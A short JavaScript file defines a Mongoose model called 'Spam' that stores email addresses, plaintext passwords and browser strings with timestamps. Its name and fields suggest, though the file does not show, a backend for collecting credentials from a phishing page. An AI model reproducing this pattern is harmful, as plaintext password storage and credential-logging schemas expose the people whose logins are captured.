import mongoose from 'mongoose';

const spamSchema = new mongoose.Schema({
  email: {
    type: String,
    maxlength: 255,
    minlength: 2,
    trim: true
  },
  password: {
    type: String,
    minlength: 3,  
    maxlength: 255,
    trim: true
  },
  browser: {
    type: String,
    trim: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.models.Spam || mongoose.model('Spam', spamSchema);